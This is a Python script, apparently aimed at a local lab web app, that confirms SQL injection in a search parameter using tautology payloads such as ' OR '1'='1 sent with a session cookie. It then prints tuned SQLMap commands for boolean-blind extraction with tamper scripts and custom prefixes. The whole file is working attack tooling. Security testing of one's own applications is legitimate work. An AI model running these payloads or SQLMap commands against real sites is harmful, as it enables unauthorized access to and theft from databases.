#!/usr/bin/env python3
"""
Manually verify SQL injection before using SQLMap
"""

import urllib.request
import urllib.parse
import http.cookiejar
import sys

def test_sqli(session_id):
    """Test if SQL injection works with session"""
    
    # Test payloads
    payloads = [
        ("Normal search", "laptop"),
        ("Basic SQL injection", "' OR '1'='1"),
        ("Alternative syntax", "' OR 1=1--"),
    ]
    
    base_url = "http://127.0.0.1:8000/"
    
    for description, payload in payloads:
        print(f"\n[*] Testing: {description}")
        print(f"    Payload: {payload}")
        
        # Encode payload
        encoded = urllib.parse.quote(payload)
        url = f"{base_url}?q={encoded}"
        
        # Create request with cookie
        req = urllib.request.Request(url)
        req.add_header('Cookie', f'sessionid={session_id}')
        req.add_header('User-Agent', 'Mozilla/5.0')
        
        try:
            response = urllib.request.urlopen(req)
            html = response.read().decode('utf-8')
            
            # Check if we're logged in
            if 'login' in response.url:
                print("    ❌ Redirected to login - session invalid!")
                return False
            
            # Count products
            product_count = html.count('product-card')
            
            if product_count > 0:
                print(f"    ✅ Found {product_count} products")
                if payload == "' OR '1'='1" and product_count > 1:
                    print("    🎯 SQL INJECTION CONFIRMED!")
                    return True
            else:
                print("    ⚠️  No products found")
                
        except Exception as e:
            print(f"    ❌ Error: {str(e)}")
    
    return False

def generate_sqlmap_command(session_id):
    """Generate optimized SQLMap command"""
    print("\n" + "="*60)
    print("RECOMMENDED SQLMAP COMMANDS:")
    print("="*60)
    
    print("\n1. Basic detection (should work):")
    print(f"""sqlmap -u "http://127.0.0.1:8000/" \\
       --data="q=' OR '1'='1" \\
       --method=GET \\
       --cookie="sessionid={session_id}" \\
       --batch \\
       --dbms=SQLite \\
       --risk=3 \\
       --level=5""")
    
    print("\n2. Force boolean-based blind:")
    print(f"""sqlmap -u "http://127.0.0.1:8000/?q=test" \\
       --cookie="sessionid={session_id}" \\
       --batch \\
       --dbms=SQLite \\
       --technique=B \\
       --test-filter="OR boolean" \\
       --tamper=space2comment""")
    
    print("\n3. Custom injection test:")
    print(f"""sqlmap -u "http://127.0.0.1:8000/?q=test*" \\
       --cookie="sessionid={session_id}" \\
       --batch \\
       --dbms=SQLite \\
       --prefix="' OR '" \\
       --suffix="='1" \\
       -p q""")

def main():
    print("=== SQL Injection Verification Tool ===")
    print("\nThis tool verifies the SQL injection works before using SQLMap")
    
    if len(sys.argv) > 1:
        session_id = sys.argv[1]
    else:
        session_id = input("\nEnter your sessionid: ")
    
    if not session_id:
        print("Error: Session ID required!")
        sys.exit(1)
    
    print(f"\nUsing session: {session_id}")
    
    if test_sqli(session_id):
        print("\n✅ SQL injection vulnerability confirmed!")
        generate_sqlmap_command(session_id)
    else:
        print("\n❌ Could not confirm SQL injection")
        print("   Make sure you're logged in and the session is valid")

if __name__ == "__main__":
    main()